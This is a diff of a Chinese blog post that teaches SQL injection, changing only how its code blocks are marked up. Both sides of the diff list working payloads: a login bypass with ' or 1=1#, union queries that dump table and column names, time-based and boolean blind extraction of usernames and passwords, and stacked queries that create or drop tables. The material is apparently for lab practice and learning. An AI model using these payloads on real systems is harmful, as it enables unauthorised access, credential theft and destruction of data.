@@ -6,13 +6,13 @@
     <meta charset="utf-8">
     <meta name="keywords" content="SQL注入, Qiu-lan&#39;s blog">
     <meta name="description" content="一、判断注入类型按照注入点类型分类数字型注入​        SQL中的语句格式：
-1select * from users where id =x
+select * from users where id =x
 
 
 
     判断方法：使用 1 and 1=1  ，1 and 1=2 来判断
 
-   ">
+    ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -57,7 +57,7 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 7.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 <body>
@@ -402,7 +402,7 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="一、判断注入类型"><a href="#一、判断注入类型" class="headerlink" title="一、判断注入类型"></a>一、判断注入类型</h2><h3 id="按照注入点类型分类"><a href="#按照注入点类型分类" class="headerlink" title="按照注入点类型分类"></a>按照注入点类型分类</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>​        SQL中的语句格式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id =x</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id =x</code></pre>
 
 
 
@@ -419,7 +419,7 @@
        说明是数字型注入
 </code></pre>
 <h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>​        SQL中的语句格式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id =&#x27;x&#x27;</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id =&#x27;x&#x27;</code></pre>
 
 
 
@@ -439,13 +439,13 @@
 <p>​    SQL中的语句格式：select * from database.table where users like ‘%要查询的关键字%’</p>
 <p>   判断方法：</p>
 <p>​     某个商品名称%’ and 1&#x3D;1 and ‘%’&#x3D;’  （这个语句的功能就相当于普通SQL注入的 and 1&#x3D;1）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from database.table where users like &#x27;%某个商品名称%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;%&#x27;</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from database.table where users like &#x27;%某个商品名称%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;%&#x27;</code></pre>
 
 
 
 <p>​    页面显示正常</p>
 <p>​     某个商品名称%’ and 1&#x3D;2 and ‘%’&#x3D;’  （这个语句的功能就相当于普通SQL注入的 and 1&#x3D;2）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from database.table where users like &#x27;%某个商品名称%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;%&#x27;</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from database.table where users like &#x27;%某个商品名称%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;%&#x27;</code></pre>
 
 
 
@@ -455,24 +455,24 @@
 <p>​    作用：是爆出表中的所有字段</p>
 <p>​    举例：验证用户名和密码的语句</p>
 <p>​    【在地址栏中的注释符可以用：–+】</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$sql="select * from users where username=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;";</code></pre>
 
 
 
 <p>​    当存在SQL注入，我们在密码出输入 1’ or 1 &#x3D; 1# 后，整条语句变成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;1&#x27; or 1 = 1#&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$sql="select * from users where username=&#x27;1&#x27; or 1 = 1#&#x27; and password=&#x27;$pwd&#x27;";</code></pre>
 
 
 
 <p>​    # 是注释符号，后面的内容被注释掉，or 是或，作用两边有一边为真，结果就为真，因为右边的 1&#x3D;1 为真，所以上述语句等价于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27; or 1 = 1</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where username=&#x27;1&#x27; or 1 = 1</code></pre>
 
 <p>​    即使用户名不存在也没关系，1&#x3D;1 为 true，等价于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users</code></pre>
 
 <p>​    所以该语句的作用是爆破出所有字段</p>
 <h6 id="查询字段数"><a href="#查询字段数" class="headerlink" title="查询字段数"></a>查询字段数</h6><p>​    </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：1&#x27;  order by 数值#</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">语句：1&#x27;  order by 数值#</code></pre>
 
 
 
@@ -485,7 +485,7 @@
     语句：-1&#39; union select 1,database(),3#
 </code></pre>
 <h6 id="爆破表格名"><a href="#爆破表格名" class="headerlink" title="爆破表格名"></a>爆破表格名</h6><p>​        </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键：group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre>
 
 
 
@@ -494,17 +494,17 @@
     语句：-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),3#
 </code></pre>
 <p>【注意：如果 information_schema 被过滤了，可以使用 sys】</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&amp;&amp;substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),1,1)=&#x27;f&#x27;</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">1&&substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),1,1)=&#x27;f&#x27;</code></pre>
 
 
 
-<h6 id="爆破表格字段"><a href="#爆破表格字段" class="headerlink" title="爆破表格字段"></a>爆破表格字段</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键：group_concat(column_name) from information_schema.columns where table_name=&#x27;表格名&#x27;</span><br></pre></td></tr></table></figure>
+<h6 id="爆破表格字段"><a href="#爆破表格字段" class="headerlink" title="爆破表格字段"></a>爆破表格字段</h6><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(column_name) from information_schema.columns where table_name=&#x27;表格名&#x27;</code></pre>
 
 
 
 <pre><code>    语句：-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;表格名&#39;,3#
 </code></pre>
-<h6 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h6><h6 id=""><a href="#" class="headerlink" title=""></a></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键：group_concat(id,username,password) from geekuser</span><br></pre></td></tr></table></figure>
+<h6 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h6><h6 id=""><a href="#" class="headerlink" title=""></a></h6><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(id,username,password) from geekuser</code></pre>
 
 
 
@@ -537,26 +537,27 @@
 <blockquote>
 <p>?id&#x3D;1’ and if(left(<strong>database()</strong>,1)&#x3D;’s’,sleep(6),1)–+</p>
 </blockquote>
-<h5 id="第四步：判断数据库表名长度"><a href="#第四步：判断数据库表名长度" class="headerlink" title="第四步：判断数据库表名长度"></a>第四步：判断数据库表名长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(6),1)--+</span><br></pre></td></tr></table></figure>
+<h5 id="第四步：判断数据库表名长度"><a href="#第四步：判断数据库表名长度" class="headerlink" title="第四步：判断数据库表名长度"></a>第四步：判断数据库表名长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(6),1)--+</code></pre>
 
-<h5 id="第五步：爆破数据库表名"><a href="#第五步：爆破数据库表名" class="headerlink" title="第五步：爆破数据库表名"></a>第五步：爆破数据库表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101,sleep(6),1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="第五步：爆破数据库表名"><a href="#第五步：爆破数据库表名" class="headerlink" title="第五步：爆破数据库表名"></a>第五步：爆破数据库表名</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101,sleep(6),1)--+
+</code></pre>
 
 <p>刚开始判断的时候可以 &gt;97、&gt;99这样去快速逼近正确值，最后再用等号去确定</p>
-<h5 id="第六步：爆破所有字段名长度"><a href="#第六步：爆破所有字段名长度" class="headerlink" title="第六步：爆破所有字段名长度"></a>第六步：爆破所有字段名长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(6),1)--+</span><br></pre></td></tr></table></figure>
+<h5 id="第六步：爆破所有字段名长度"><a href="#第六步：爆破所有字段名长度" class="headerlink" title="第六步：爆破所有字段名长度"></a>第六步：爆破所有字段名长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))>20,sleep(6),1)--+</code></pre>
 
 <p>这里的 users 是通过前面的爆破数据库表名爆破出来的，那一步没过，是到不了这一步的，只有确定了账号密码等信息在哪个表，哪个字段才行</p>
-<h5 id="第七步：爆破字段名"><a href="#第七步：爆破字段名" class="headerlink" title="第七步：爆破字段名"></a>第七步：爆破字段名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(6),1)--+</span><br></pre></td></tr></table></figure>
+<h5 id="第七步：爆破字段名"><a href="#第七步：爆破字段名" class="headerlink" title="第七步：爆破字段名"></a>第七步：爆破字段名</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))>99,sleep(6),1)--+</code></pre>
 
 <h5 id="第八步：判断字段内容长度"><a href="#第八步：判断字段内容长度" class="headerlink" title="第八步：判断字段内容长度"></a>第八步：判断字段内容长度</h5><p>假设得出存在 username、password等字段，那账号密码等数据大概率保存在这里面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(6),1)--+</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and if(length((select group_concat(username,password) from users))>109,sleep(6),1)--+</code></pre>
 
 <h5 id="第九步：爆破字段内容"><a href="#第九步：爆破字段内容" class="headerlink" title="第九步：爆破字段内容"></a>第九步：爆破字段内容</h5><p>方法一：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))=68,sleep(6),1)--+</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))=68,sleep(6),1)--+</code></pre>
 
 <p>十进制 68 对应的 ASCII 字符是 D</p>
 <p>方法二：</p>
 <p>个人感觉方法二更快，方法一还得去 ASCII 表对着找</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(left((select group_concat(username,password) from users),1)=&#x27;D&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and if(left((select group_concat(username,password) from users),1)=&#x27;D&#x27;,sleep(5),1)--+</code></pre>
 
 <h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h4><p><strong>使用场景：</strong>适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false</p>
 <p>布尔盲注主要用到 <strong>length()<strong>、</strong>ascii()<strong>、</strong>substr()</strong> 这三个函数</p>
@@ -572,41 +573,43 @@
 <p>注意：1后面的 ‘ 是需要判断的，也有可能是 “ ，也可能是 ‘)、”) 这是语句里面的闭合符合，也可以是 &gt;8、&lt;8 之类的</p>
 <p>若是在输入框中，and 要改成 or</p>
 <h5 id="第二步：爆破数据库名"><a href="#第二步：爆破数据库名" class="headerlink" title="第二步：爆破数据库名"></a>第二步：爆破数据库名</h5><p>一个一个字符对着 ASCII 匹配，不难但是很耗时</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))=115--+</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and ascii(substr((select database()),1,1))=115--+</code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(&quot;788888&quot;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注因为要判断每一个字符，所以长度为一，后面就改变读取位置就可以了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">substr("788888",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注因为要判断每一个字符，所以长度为一，后面就改变读取位置就可以了
+</code></pre>
 
 <p>另一种方法：left()**</p>
 <blockquote>
 <p>?id&#x3D;1’ and left(database(),1)&#x3D;’s’ –+  （判断第一个字符是不是 s）</p>
 </blockquote>
 <h5 id="第三步：判断数据库表长度"><a href="#第三步：判断数据库表长度" class="headerlink" title="第三步：判断数据库表长度"></a>第三步：判断数据库表长度</h5><p>判断数据库表长度：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29--+</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29--+</code></pre>
 
 <p>上面那条语句的意思是判断所有数据库表名的长度</p>
 <h5 id="第四步：爆破表名"><a href="#第四步：爆破表名" class="headerlink" title="第四步：爆破表名"></a>第四步：爆破表名</h5><p>一个一个字符爆破表名</p>
 <p>方法一：匹配字符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+</code></pre>
 
 <p>和上面一样，一个一个试，或者用脚本</p>
 <p>方法二：直接匹配名字</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 2,1)=&#x27;uagents&#x27;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 2,1)=&#x27;uagents&#x27;--+
+</code></pre>
 
-<h5 id="第五步：判断所有字段名长度"><a href="#第五步：判断所有字段名长度" class="headerlink" title="第五步：判断所有字段名长度"></a>第五步：判断所有字段名长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))=20--+</span><br></pre></td></tr></table></figure>
+<h5 id="第五步：判断所有字段名长度"><a href="#第五步：判断所有字段名长度" class="headerlink" title="第五步：判断所有字段名长度"></a>第五步：判断所有字段名长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))=20--+</code></pre>
 
-<h5 id="第六步：爆破字段名"><a href="#第六步：爆破字段名" class="headerlink" title="第六步：爆破字段名"></a>第六步：爆破字段名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99--+</span><br></pre></td></tr></table></figure>
+<h5 id="第六步：爆破字段名"><a href="#第六步：爆破字段名" class="headerlink" title="第六步：爆破字段名"></a>第六步：爆破字段名</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))>99--+</code></pre>
 
 <p>同样也可以直接匹配名字：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1)=&#x27;username&#x27;--+</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and (select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1)=&#x27;username&#x27;--+</code></pre>
 
 <p>最后匹配发现有：username、password （这两个是比较关键的）</p>
-<h5 id="第七步：判断所有字段内容长度"><a href="#第七步：判断所有字段内容长度" class="headerlink" title="第七步：判断所有字段内容长度"></a>第七步：判断所有字段内容长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span><br></pre></td></tr></table></figure>
+<h5 id="第七步：判断所有字段内容长度"><a href="#第七步：判断所有字段内容长度" class="headerlink" title="第七步：判断所有字段内容长度"></a>第七步：判断所有字段内容长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and length((select group_concat(username,password) from users))>109--+</code></pre>
 
 <h5 id="第八步：爆破字段值（匹配账号密码）"><a href="#第八步：爆破字段值（匹配账号密码）" class="headerlink" title="第八步：爆破字段值（匹配账号密码）"></a>第八步：爆破字段值（匹配账号密码）</h5><p>方法一：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))>50--+</code></pre>
 
 <p>方法二：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select username from users where id=1)=&#x27;dumb&#x27;--+</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and (select username from users where id=1)=&#x27;dumb&#x27;--+</code></pre>
 
 <h2 id="五、堆叠注入"><a href="#五、堆叠注入" class="headerlink" title="五、堆叠注入"></a>五、堆叠注入</h2><p>概念：堆叠注入，也称堆查询注入，顾名思义就是多条语句同时执行。在SQL中，分号 ; 用来表示一条 sql 语句的结束。在 ; 结束一个sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入，攻击就是利用此特点，在第二条语句中构造payload。</p>
 <p>原理：很简单，mysql_multi_query() 支持多条sql语句同时执行</p>
@@ -614,14 +617,14 @@
 <p>号 “ ; ”。</p>
 <p>堆叠注入优点：联合查询 union 也可拼接语句（有局限性），但是堆叠注入能注入任意语句</p>
 <p>当然了，堆叠注入的条件比较苛刻，可能受到API或者数据库引擎不支持的限制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未对 &quot;;&quot; 号进行过滤；未禁止执行多条sql语句</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">未对 ";" 号进行过滤；未禁止执行多条sql语句</code></pre>
 
 <p>举例一：</p>
 <p>新建表，表名：test</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;create table test like users; </span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id=1;create table test like users;</code></pre>
 
 <p>删除表，表名：test</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;drop table test;</span><br></pre></td></tr></table></figure>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id=1;drop table test;</code></pre>
 
 <p>……还有很多，可以自行搜索</p>
 <h6 id="表结构："><a href="#表结构：" class="headerlink" title="表结构："></a>表结构：</h6><p>​        表结构就是定义数据表文件名，确定数据表包含哪些字段，各字段的字段名、字段类型、及宽度，并将这些数据输入到计算机当中。</p>
